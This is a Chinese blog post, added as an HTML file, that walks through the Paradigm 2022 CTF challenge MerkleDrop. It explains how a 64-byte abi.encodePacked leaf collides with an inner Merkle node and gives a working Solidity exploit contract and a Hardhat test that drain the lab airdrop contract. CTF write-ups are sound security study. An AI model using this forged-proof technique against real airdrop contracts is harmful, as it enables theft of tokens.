@@ -1,0 +1,686 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="baidu-site-verification" content="093lY4ziMu" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="description" content="Thomas_Xu&#39;s Bolg">
+    <meta name="keyword"  content="Thomas_Xu, BlockChain">
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <!--<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>-->
+    <title>
+        
+          Paradigm 题解 MerkleDrop - Thomas_Xu
+        
+    </title>
+
+    <link rel="canonical" href="https://dusign.net/paradigm22-merkleDrop/">
+
+    <!-- Bootstrap Core CSS -->
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+
+    <!-- Custom CSS --> 
+    
+        
+<link rel="stylesheet" href="/css/dusign-light.css">
+
+        
+<link rel="stylesheet" href="/css/dusign-common-light.css">
+
+        
+<link rel="stylesheet" href="/css/font-awesome.css">
+
+        
+<link rel="stylesheet" href="/css/toc.css">
+
+        <!-- background effects end -->
+    
+    
+    <!-- Pygments Highlight CSS -->
+    
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+    
+<link rel="stylesheet" href="/css/widget.css">
+
+
+    
+<link rel="stylesheet" href="/css/rocket.css">
+
+
+    
+<link rel="stylesheet" href="/css/signature.css">
+
+
+    
+<link rel="stylesheet" href="/css/fonts.googleapis.css">
+
+
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+    <!-- photography -->
+    
+<link rel="stylesheet" href="/css/photography.css">
+
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- background effects start -->
+    
+    <!-- background effects end -->
+
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            
+                background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('page3.png')
+                /*post*/
+            
+        
+    }
+    
+    #signature{
+        background-image: url('/img/signature/dusign.png');
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#Paradigm" title="Paradigm">Paradigm</a>
+                            
+                        </div>
+                        <h1>Paradigm 题解 MerkleDrop</h1>
+                        <h2 class="subheading"></h2>
+                        <span class="meta">
+                            Posted by Thomas_Xu on
+                            2022-10-28
+                        </span>
+
+                        
+                            <div class="blank_box"></div>
+                            <span class="meta">
+                                Words <span class="post-count">1.5k</span> and
+                                Reading Time <span class="post-count">6</span> Minutes
+                            </span>
+                            <div class="blank_box"></div>
+                            <!-- 不蒜子统计 start -->
+                            <span class="meta">
+                                Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
+                            </span>
+                            <!-- 不蒜子统计 end -->
+                        
+
+                    </div>
+                
+
+                </div>
+            </div>
+        </div>      
+    </div>
+
+    
+    <div class="waveWrapper">
+        <div class="wave wave_before" style="background-image: url('/img/wave-light.png')"></div>
+        <div class="wave wave_after" style="background-image: url('/img/wave-light.png')"></div>
+    </div>
+    
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Thomas_Xu&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/categories/">Categories</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="paradigm-2022-ctf-题解——MerkleDrop"><a href="#paradigm-2022-ctf-题解——MerkleDrop" class="headerlink" title="paradigm 2022 ctf 题解——MerkleDrop"></a>paradigm 2022 ctf 题解——MerkleDrop</h1><hr>
+<pre><code>author：Thomas_Xu
+</code></pre><p><strong>环境配置</strong>:<br>由于题目环境需要使用docker，环境配置有点繁琐。我重新搭了一个hardhat框架的测试环境,而由于题目出在以太坊的主链上,并使用<code>Alchemy</code>fork了一个主网节点进行测试</p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先先来看一下这道题目的描述<code>Were you whitelisted?</code>你是否在白名单里？显而易见，这是一道关于空头白名单的问题。而题目给我们提供了64个叶子节点的验证信息，其中包括每个用户地址对应的 <code>index</code>，<code>amount</code> 以及 <code>proof</code> 验证hash。用户可以凭此文件中的相关 Proofs 到合约中 Claim 相应数量的 Token。似乎我们要通过某种漏洞来获取白名单权限，我们进入到<code>Setup</code>中去看判断条件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function isSolved() public view returns (bool) &#123;</span><br><span class="line">        bool condition1 &#x3D; token.balanceOf(address(merkleDistributor)) &#x3D;&#x3D; 0;</span><br><span class="line">        bool condition2 &#x3D; false;</span><br><span class="line">        for (uint256 i &#x3D; 0; i &lt; 64; ++i) &#123;</span><br><span class="line">            if (!merkleDistributor.isClaimed(i)) &#123;</span><br><span class="line">                condition2 &#x3D; true;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return condition1 &amp;&amp; condition2;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>有两个判题：</p>
+<ul>
+<li>要求领完空投钱包的余额</li>
+<li>要求白名单里至少有1个人没有领空投</li>
+</ul>
+<p>算了一下，json文件中64个地址能领的金额相加刚好等于<code>merkleDistributor</code>中的余额 75 ETH，想要同时完成这两个判题貌似是不可能的事。</p>
+<p>如果是按照标准实现的Merkle Tree我们几乎不可能对其进行攻击。那么让我们来对比一下这里的代码和标准实现的Merkle Tree有什么不同吧。<br><img src="merkledrop_01.jpg" alt=""></p>
+<p>这个<code>uint96</code>是最可疑的地方</p>
+<p>让我们回顾一下MerkleTree的验证过程</p>
+<p><img src="MerkleHash.png" alt=""></p>
+<p>Merkle Tree 的基本原理是依靠叶子节点的值一层层计算出 hash，最终得到 Root 值，验证某一个叶子节点是否在 Merkle Tree 中，只需提供相对应的 Proofs 路径进行计算，观察最终的 Root 值是否一致即可。</p>
+<p>而这个题最巧妙的一点就是：由于<code>amout</code>字段使用了uint96，导致出现了一个巧合。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function claim(uint256 index, address account, uint96 amount, bytes32[] memory merkleProof) external &#123;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Verify the merkle proof.</span><br><span class="line">        bytes32 node &#x3D; keccak256(abi.encodePacked(index, account, amount));</span><br><span class="line">        require(MerkleProof.verify(merkleProof, merkleRoot, node), &#39;MerkleDistributor: Invalid proof.&#39;);</span><br><span class="line"></span><br><span class="line">      	...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>claim里的node节点hash计算方式是先<code>abi.encodePacked(index, account, amount)</code>再hash。而这里的三个字段为</p>
+<ul>
+<li>index[uint256]: 32bytes</li>
+<li>account[address]:20bytes</li>
+<li>amount[uint96]:12bytes</li>
+</ul>
+<p>这三个字段加起来刚好是64bytes。正好是两个 keccak256 hash 结果拼接在一起的大小。可以看成是其中一个 hash 值作为 index, 另一个 hash 值作为 account + amount。</p>
+<p>那我们就可以利用此巧合去构造一个假的输入，而这个输入可以完美通过hash验证。</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>现在的重点就是去构造这个”巧合的哈希“</p>
+<p>空投的总数量为7500个ETH，即0x0fe1c215e8f838e00000，而uint96的最大值为0xffffffffffffffffffffffff，很明显，如果是随机的哈希结果，是会远远大于空投的总数量。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xffffffffffffffffffffffff</span><br><span class="line">0x00000fe1c215e8f838e00000</span><br></pre></td></tr></table></figure>
+<p>二者至少差了5个0，不过这也给我们提供了一个思路，我们去tree.json搜一下有5个连续0的哈希。</p>
+<p><img src="C:\Users\小栩\Documents\GitHub\Conract_Attack\images\ParadigmCTF\2022\marklejson_serch.png" alt=""></p>
+<p>很容易发现37这个节点</p>
+<p>更巧合的是从第一个0处把这个哈希截断的话，前一部分刚好是20bytes,后一部分刚好是12bytes。换句话说，这个哈希可以被解析为<code>account + amount</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">account: 0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A</span><br><span class="line">amount: 0x00000f40f0c122ae08d2207b</span><br></pre></td></tr></table></figure>
+<p>来看看<code>MerkleProof</code>里是怎么验证节点的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">function verify(</span><br><span class="line">    bytes32[] memory proof,</span><br><span class="line">    bytes32 root,</span><br><span class="line">    bytes32 leaf</span><br><span class="line">  )</span><br><span class="line">    internal</span><br><span class="line">    pure</span><br><span class="line">    returns (bool)</span><br><span class="line">  &#123;</span><br><span class="line">    bytes32 computedHash &#x3D; leaf;</span><br><span class="line"></span><br><span class="line">    for (uint256 i &#x3D; 0; i &lt; proof.length; i++) &#123;</span><br><span class="line">      bytes32 proofElement &#x3D; proof[i];</span><br><span class="line"></span><br><span class="line">      if (computedHash &lt; proofElement) &#123;</span><br><span class="line">        &#x2F;&#x2F; Hash(current computed hash + current element of the proof)</span><br><span class="line">        computedHash &#x3D; keccak256(abi.encodePacked(computedHash, proofElement));</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        &#x2F;&#x2F; Hash(current element of the proof + current computed hash)</span><br><span class="line">        computedHash &#x3D; keccak256(abi.encodePacked(proofElement, computedHash));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check if the computed hash (root) is equal to the provided root</span><br><span class="line">    return computedHash &#x3D;&#x3D; root;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其实验证过程和merkletree的标准实现一样，将叶子节点和验证节点自下而上，两两哈希拼接在一起后再取哈希，最终和root哈希比较是否相等。</p>
+<p>那么由于之前的巧合，我们可以通过index为37节点的第一个proof节点为突破口。</p>
+<blockquote>
+<p>由于验证过程的第一次验证（被验证节点和第一个proof节点hex）也是需要37号节点的哈希和我们的“突破口”哈希拼接后再取哈希进行后面的操作。</p>
+<p>那么我们就可以在第一次验证的这个点做文章了</p>
+</blockquote>
+<p>我们回过头来看一看<code>claim</code>函数里面是怎么计算的节点哈希：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes32 node &#x3D; keccak256(abi.encodePacked(index, account, amount));</span><br></pre></td></tr></table></figure>
+<p>之前讲到，<code>index</code>可以看作前哈希，<code>account</code>和<code>amount</code>可以看作后哈希，那么我们就可以直接构造出第一次验证时的拼接。</p>
+<p>也就是说我们可以完美的用“意外”的参数通过验证。</p>
+<p>但此时<code>account</code>为<code>0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A</code>,amount为<code>0x00000f40f0c122ae08d2207b</code>这都是意外的参数。而<code>amount</code>换算之后刚好小于75</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">计算一下还剩多少token未领</span><br><span class="line">0x0fe1c215e8f838e00000 - 0x00000f40f0c122ae08d2207b &#x3D; </span><br><span class="line">0xa0d154c64a300ddf85</span><br></pre></td></tr></table></figure>
+<p>而这个amout刚好与index为8的节点amout相同，那么只要通过这个叶子节点，就可以领完空投合约里的所有token，解决本题。</p>
+<p>附exploit合约</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">contract Exploit &#123;</span><br><span class="line">    constructor(Setup setup) &#123;</span><br><span class="line">        MerkleDistributor merkleDistributor &#x3D; setup.merkleDistributor();</span><br><span class="line">        </span><br><span class="line">        &#x2F;&#x2F;通过拼接哈希，跳过第一个验证节点。</span><br><span class="line">        bytes32[] memory merkleProof1 &#x3D; new bytes32[](5);</span><br><span class="line">        merkleProof1[0] &#x3D; bytes32(0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d);</span><br><span class="line">        merkleProof1[1] &#x3D; bytes32(0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde);</span><br><span class="line">        merkleProof1[2] &#x3D; bytes32(0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813);</span><br><span class="line">        merkleProof1[3] &#x3D; bytes32(0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c);</span><br><span class="line">        merkleProof1[4] &#x3D; bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5);</span><br><span class="line">        merkleDistributor.claim(</span><br><span class="line">                0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442, </span><br><span class="line">                address(0x00d48451c19959e2d9bd4e620fbe88aa5f6f7ea72a), </span><br><span class="line">                0x00000f40f0c122ae08d2207b,</span><br><span class="line">                merkleProof1</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;用index 8取完剩下的token即可</span><br><span class="line">        bytes32[] memory merkleProof2 &#x3D; new bytes32[](6);</span><br><span class="line">        merkleProof2[0] &#x3D; bytes32(0xe10102068cab128ad732ed1a8f53922f78f0acdca6aa82a072e02a77d343be00);</span><br><span class="line">        merkleProof2[1] &#x3D; bytes32(0xd779d1890bba630ee282997e511c09575fae6af79d88ae89a7a850a3eb2876b3);</span><br><span class="line">        merkleProof2[2] &#x3D; bytes32(0x46b46a28fab615ab202ace89e215576e28ed0ee55f5f6b5e36d7ce9b0d1feda2);</span><br><span class="line">        merkleProof2[3] &#x3D; bytes32(0xabde46c0e277501c050793f072f0759904f6b2b8e94023efb7fc9112f366374a);</span><br><span class="line">        merkleProof2[4] &#x3D; bytes32(0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c);</span><br><span class="line">        merkleProof2[5] &#x3D; bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5);</span><br><span class="line">        merkleDistributor.claim(8, address(0x249934e4C5b838F920883a9f3ceC255C0aB3f827), 0xa0d154c64a300ddf85, merkleProof2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>附hardhat测试用例</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; expect &#125; = <span class="built_in">require</span>(<span class="string">"chai"</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">'hardhat'</span>);</span><br><span class="line">describe(<span class="string">"Challange merkleDrop"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> attacker,deployer;</span><br><span class="line">    it(<span class="string">"should return the solved"</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        [attacker,deployer] = <span class="keyword">await</span> ethers.getSigners();</span><br><span class="line">        <span class="keyword">const</span> SetupFactory = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">"MerkleSetup"</span>, attacker);</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">const</span> setup = <span class="keyword">await</span> SetupFactory.deploy(&#123;</span><br><span class="line">            value: ethers.utils.parseEther(<span class="string">"75"</span>)</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//Exploit</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> ExploitFactory = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">"MerkleDropExploit"</span>,attacker);</span><br><span class="line">        <span class="keyword">await</span> ExploitFactory.deploy(setup.address);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        expect(<span class="keyword">await</span> setup.isSolved()).to.equal(<span class="literal">true</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
+
+                
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/ERC20-721-1155-998/" data-toggle="tooltip" data-placement="top" title="ERC20-721-1155-998">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/paradigm22-rescue/" data-toggle="tooltip" data-placement="top" title="Paradigm 题解 Rescue">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                <!-- tip start -->
+                
+                <div class="comment_notes_blank"></div>
+                <div class="visitor_notice">
+                    <img 
+                        src="/img/notice.png" 
+                        alt="notice"
+                        title="notice"/>
+                    <p class="notice">
+                        true
+                    </p>
+                </div>
+                
+
+                
+                <div class="comment_notes">
+                    <p>
+                        This is copyright.
+                    </p>
+                </div>
+                
+                <!-- tip end -->
+
+                <!-- Music start-->
+                
+                
+<link rel="stylesheet" href="/css/music-player/fonts/iconfont.css">
+
+
+<link rel="stylesheet" href="/css/music-player/css/reset.css">
+
+
+<link rel="stylesheet" href="/css/music-player/css/player.css">
+
+
+<div class="music-player">
+    <audio class="music-player__audio" ></audio>
+    <div class="music-player__main">
+        <div class="music-player__blur"></div>
+        <div class="music-player__disc">
+            <div class="music-player__image">
+                <img width="100%" src="" alt="">
+            </div>
+            <div class="music-player__pointer"><img width="100%" src="/img/cd_tou.png" alt=""></div>
+        </div>
+        <div class="music-player__controls">
+            <div class="music__info">
+                <h3 class="music__info--title">...</h3>
+                <p class="music__info--singer">...</p>
+            </div>
+            <div class="player-control">
+                <div class="player-control__content">
+                    <div class="player-control__btns">
+                        <div class="player-control__btn player-control__btn--prev"><i class="iconfont icon-prev"></i></div>
+                        <div class="player-control__btn player-control__btn--play"><i class="iconfont icon-play"></i></div>
+                        <div class="player-control__btn player-control__btn--next"><i class="iconfont icon-next"></i></div>
+                        <div class="player-control__btn player-control__btn--mode"><i class="iconfont icon-loop"></i></div>
+                    </div>
+                    <div class="player-control__volume">
+                        <div class="control__volume--icon player-control__btn"><i class="iconfont icon-volume"></i></div>
+                        <div class="control__volume--progress player_progress"></div>
+                    </div>
+                </div>
+                <div class="player-control__content">
+                    <div class="player__song--progress player_progress"></div>
+                    <div class="player__song--timeProgess nowTime">00:00</div>
+                    <div class="player__song--timeProgess totalTime">00:00</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<script src="/js/music-player/utill.js"></script>
+
+
+<script src="/js/music-player/jquery.min.js"></script>
+
+<!-- netease; qqkg -->
+<!--
+<script src="/js/music-player/player.js?library=config.music.library.js"></script>
+-->
+<script src="../../../../js/music-player/player.js?library=netease&music=https://kg.qq.com/node/play?s=7deFpz7Z26Jmv7di&g_f=share_html"></script>
+                
+                <!-- Music end -->
+
+                <!-- Sharing -->
+                
+                <div class="social-share"  data-wechat-qrcode-helper="" align="center"></div>
+                <!--  css & js -->
+                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+                <script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+                
+                <!-- Sharing -->
+
+                <!-- gitment start -->
+                
+                <!-- gitment end -->
+
+                <!-- 来必力City版安装代码 -->
+                
+                <!-- City版安装代码已完成 -->
+
+                <!-- disqus comment start -->
+                
+                <!-- disqus comment end -->
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+    
+      
+        <aside id="sidebar">
+          <div id="toc" class="toc-article">
+          <strong class="toc-title">Contents</strong>
+          
+            
+              <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#paradigm-2022-ctf-题解——MerkleDrop"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">paradigm 2022 ctf 题解——MerkleDrop</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#题目分析"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">题目分析</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Exploit"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">Exploit</span></a></li></ol></li></ol>
+            
+          
+          </div>
+        </aside>
+      
+    
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#Paradigm" title="Paradigm">Paradigm</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+
+
+<style  type="text/css">
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/ThomasXu-blockchain">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Thomas_Xu 2022 
+                    <br>
+                    Powered by 
+                    <a href="https://github.com/dusign/hexo-theme-snail" target="_blank" rel="noopener">
+                        <i>hexo-theme-snail</i>
+                    </a> | 
+                    <iframe name="star" style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0"
+                        width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=dusign&repo=hexo-theme-snail&type=star&count=true">
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+
+</footer>
+
+<!-- jQuery -->
+
+<script src="/js/jquery.min.js"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+
+<script src="/js/bootstrap.min.js"></script>
+
+
+<!-- Custom Theme JavaScript -->
+
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- Search -->
+
+<script src="/js/search.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://dusign.net/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- Search -->
+
+    <script type="text/javascript">      
+        var search_path = "search.xml";
+        if (search_path.length == 0) {
+            search_path = "search.xml";
+        }
+    var path = "/" + search_path;
